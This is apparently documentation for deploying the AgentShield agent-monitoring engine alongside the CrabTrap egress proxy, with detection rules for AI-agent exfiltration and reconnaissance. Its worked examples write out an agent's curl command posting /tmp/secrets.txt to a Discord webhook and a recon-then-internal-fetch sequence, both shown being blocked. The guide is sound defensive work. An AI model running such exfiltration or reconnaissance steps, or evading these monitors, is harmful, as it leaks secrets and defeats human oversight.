# Deploying AgentShield with CrabTrap

This guide covers running [Brex CrabTrap](https://github.com/brexhq/CrabTrap)
and AgentShield together. The two products operate at different layers and
the combination strictly contains either alone:

| Layer | What it sees |
|---|---|
| **Agent harness hooks** (AgentShield) | Tool name + arguments + session history before the call executes |
| **Forward proxy** (CrabTrap) | The actual HTTP/HTTPS bytes that leave the host |

Each layer has gaps the other fills:

- AgentShield can't see network egress that originates from a subprocess the
  agent spawned (e.g. `npm install` fetching packages). CrabTrap can.
- CrabTrap can't tell whether an outbound connection came from an agent in
  the middle of a recon-then-exfil sequence or from background traffic; it
  has no session state. AgentShield does.

## Architecture

```
┌─────────────────────┐
│   Agent runtime     │
│  (Claude Code,      │
│   OpenClaw, etc.)   │
└──────┬──────────┬───┘
       │          │ all egress (HTTPS bytes)
       │          ▼
       │    ┌────────────┐
       │    │  CrabTrap  │  static rules + LLM judge per request
       │    │  (proxy)   │
       │    └─────┬──────┘
       │          │ writes audit log (file or stdout)
       │          ▼
       │    ┌──────────────────────────────┐
       │    │ agentshield-proxy-adapter    │  (this binary)
       │    │   stdin: NDJSON of obs       │  reads CrabTrap log via small
       │    │   POSTs each to /evaluate    │  jq filter; produces NDJSON
       │    └─────────┬────────────────────┘
       │              │
       │ tool-call    │ proxy-observation
       │ events       │ events (event_type=http_egress)
       ▼              ▼
   ┌──────────────────────────────┐
   │      AgentShield engine      │
   │  - one rule corpus           │
   │  - one verdict cache         │
   │  - one audit table           │
   │  - per-session correlation   │  ← spans tool-call + proxy events
   └──────────────────────────────┘
```

The same `session_id` flowing through both paths is what makes layer-spanning
correlation possible. See "Session correlation" below.

## What you get

| Capability | CrabTrap alone | AgentShield alone | Combined |
|---|:---:|:---:|:---:|
| Tool-call inspection (URL extracted from args) | — | ✓ | ✓ |
| Wire-byte inspection of every egress | ✓ | — | ✓ |
| Subprocess-originated egress (npm/pip/etc.) | ✓ | — | ✓ |
| Per-session behavioural rules (recon → exfil, approval fatigue) | — | ✓ | ✓ |
| One audit trail across both layers | — | — | ✓ |
| One verdict cache | — | — | ✓ |
| Layer-spanning rules (e.g. "agent did X, proxy then saw connection to Y") | — | — | ✓ |
| Hot rule reload (SIGHUP, no restart) | — | ✓ | ✓ |

The "Combined" column is unique to this deployment shape.

## Setup

### 1. Run AgentShield

Standard config; nothing CrabTrap-specific. Make sure session sequencing is
on so layer-spanning rules can correlate:

```yaml
# config.yaml
session:
  enabled: true
  window_sec: 600
  max_events: 100
```

### 2. Run CrabTrap

Follow the [CrabTrap setup guide](https://github.com/brexhq/CrabTrap). Point
the agent's HTTPS_PROXY at it. The only AgentShield-specific concern is
configuring CrabTrap's audit output to a structured form the adapter can
consume — by default CrabTrap writes to PostgreSQL plus stderr/stdout/file.

### 3. Wire the adapter

The `agentshield-proxy-adapter` consumes NDJSON from stdin and posts each
observation to AgentShield. It's intentionally generic — it accepts any
proxy whose audit log can be transformed into the [adapter schema][schema].

[schema]: ../../internal/proxyadapter/observation.go

A typical pipeline:

```bash
tail -F /var/log/crabtrap/audit.log \
  | jq -c '{
      request_id: .req_id,
      session_id: .agent_session,
      method: .method,
      url: .url,
      status: .response_status,
      decision: .decision,
      decided_by: (if .llm_response_id then "llm" else "rule" end),
      duration_ms: .duration_ms,
      timestamp: .timestamp
    }' \
  | agentshield-proxy-adapter \
      --endpoint http://localhost:8433 \
      --token "$AGENTSHIELD_AUTH_TOKEN" \
      --source crabtrap
```

The exact `jq` mapping depends on CrabTrap's actual log schema (see
[CrabTrap DESIGN.md][crabtrap-design] for the latest); the adapter only
requires `request_id`, `method`, and `url` to be present.

[crabtrap-design]: https://github.com/brexhq/CrabTrap/blob/main/DESIGN.md

### 4. Session correlation

For layer-spanning rules to fire, the same `session_id` must flow through
both paths. Two practical patterns:

1. **Agent harness injects a session header.** Configure your agent runtime
   to send a custom HTTP header on every outbound request (e.g.
   `X-Agent-Session: agent-1234`). Configure CrabTrap to log that header
   into its audit record. The jq filter then maps it into `session_id`.

2. **Best-effort by source IP.** If the agent harness can't be modified,
   omit `session_id` and pass `src_ip` in the NDJSON; the adapter will
   synthesise a session ID of the form `proxy-<source>-<src_ip>`. This
   correlates per-client but won't link to the agent's tool-call session.

## Worked examples

### Example 1: overlapping rule (both layers detect the same threat)

An agent attempts to exfiltrate via Discord webhook. Both CrabTrap and
AgentShield have rules that match `discord.com/api/webhooks`. Here's what
the operator sees:

```
T+000ms  agent calls Bash("curl -X POST -d @/tmp/secrets.txt https://discord.com/api/webhooks/12345/abcdef")
T+002ms  AgentShield evaluates the tool call (event_type=tool_call):
         - url.* enrichment populates url.host=discord.com
         - ai_agent_egress_exfil_destinations.yml fires
         - verdict: BLOCK, alert written to audit_log
         (the agent harness refuses to execute the curl)
```

If the agent harness ignores AgentShield's verdict (or if the call
originates from a subprocess AgentShield can't intercept), CrabTrap is the
second line:

```
T+050ms  curl process initiates outbound HTTPS to discord.com
T+052ms  CrabTrap evaluates: rule match on host, decision=block
T+053ms  agentshield-proxy-adapter forwards CrabTrap's observation:
         - event_type=http_egress, proxy.source=crabtrap, proxy.verdict=block
         - same session_id as the T+002ms tool call
         - ai_agent_egress_exfil_destinations.yml fires again
         (the rule's selectors include both event_type values, so it matches)
         - verdict: BLOCK, alert written to audit_log
```

Result: two audit records describing the same threat from two layers.
Operators querying AgentShield's audit table can correlate them by
`session_id` and `event_id` linkage. This is intentional duplication — if
either layer fails, the other still catches the threat.

### Example 2: rule only the joint deployment can write

An agent does internal-network reconnaissance, then later in the same
session a subprocess fetches metadata from an internal endpoint. Neither
layer alone sees enough to detect this:

```
T+000ms  agent calls Bash("ip addr show; ss -tlnp")
T+002ms  AgentShield evaluates:
         - benign-looking inspection commands
         - verdict: ALLOW, but session.tool_count for "agent-7" → 1
         (CrabTrap sees nothing — no network egress)

T+10s    agent calls Bash("npm install internal-tools")
T+10.05s AgentShield evaluates:
         - benign-looking package install
         - verdict: ALLOW, session.tool_count for "agent-7" → 2
         (still nothing on the wire)

T+15s    npm subprocess opens connection to http://10.0.5.42/tools/v1.tar.gz
T+15.01s CrabTrap evaluates:
         - generic egress, no static rule match
         - decision: allow
T+15.02s adapter forwards observation with session_id=agent-7:
         - event_type=http_egress, url.is_private_ip=true
         - session.tool_count is now 2 from the prior tool calls
         - ai_agent_recon_then_proxy_egress.yml fires
         - verdict: BLOCK
```

The recon-then-egress rule cannot run in CrabTrap (no session state) or in
AgentShield-alone (the npm subprocess egress is invisible to the tool-call
hooks). Only the joint deployment has both signals in one timeline.

[`internal/proxyadapter/integration_test.go`](../../internal/proxyadapter/integration_test.go)
verifies three cases against the project rule corpus: warm session +
private IP fires the rule (block); fresh session + private IP fires only
the per-request SSRF rule (block, but no layer-spanning trigger); warm
session + public host fires neither.

## Operational considerations

- **Performance.** The adapter is a thin transformation layer; per-event
  overhead is dominated by the AgentShield evaluation cost (see
  [performance.md](../performance.md)). The adapter is single-process and
  stdin-driven, so it scales by running multiple instances against the same
  AgentShield endpoint if proxy throughput exceeds one core.
- **Failure isolation.** If AgentShield is unreachable, the adapter logs and
  drops the observation rather than back-pressuring the proxy. The proxy
  continues operating on its own rules. Decide whether this trade-off is
  acceptable for your environment.
- **Verdict authority.** AgentShield's verdict is independent of CrabTrap's.
  CrabTrap may have allowed a request that AgentShield's rules would block;
  this is captured as `proxy.verdict: allow` plus AgentShield's own
  `action: block` in the same audit record. Operator policy decides what to
  do with the divergence.
- **TLS body coverage.** The adapter doesn't need request/response bodies to
  fire the egress rules — URL host + path is enough. If CrabTrap is
  configured without a MITM cert, body inspection is unavailable but URL
  enrichment still works.

## See also

- [Performance](../performance.md) — measured AgentShield engine numbers
- [Rules](../rules.md) — including the `url.*` enrichment fields used by
  egress and layer-spanning rules
- [internal/proxyadapter](../../internal/proxyadapter/) — adapter source
- [Issue #44](https://github.com/agentshield-ai/agentshield/issues/44) —
  origin of this integration
